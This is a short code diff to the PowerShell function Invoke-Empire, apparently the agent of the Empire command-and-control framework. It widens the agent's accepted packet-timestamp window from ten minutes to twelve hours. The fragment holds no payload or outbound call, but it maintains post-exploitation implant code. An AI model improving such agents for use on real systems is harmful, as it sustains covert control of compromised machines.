@@ -895,9 +895,10 @@ function Invoke-Empire {
         # calculate what the server's epoch should be based on the epoch diff
         #   this is just done for the first packet in a queue
         $ServerEpoch = [int][double]::Parse((Get-Date(Get-Date).ToUniversalTime()-UFormat %s)) - $script:EpochDiff
-        # if the epoch counter isn't within a +/- 10 minute range (600 seconds)
+
+        # if the epoch counter isn't within a +/- 12 hour range (43200 seconds)
         #   skip processing this packet
-        if ($counter -lt ($ServerEpoch-600) -or $counter -gt ($ServerEpoch+600)){
+        if ($counter -lt ($ServerEpoch-43200) -or $counter -gt ($ServerEpoch+43200)){
             return
         }
 
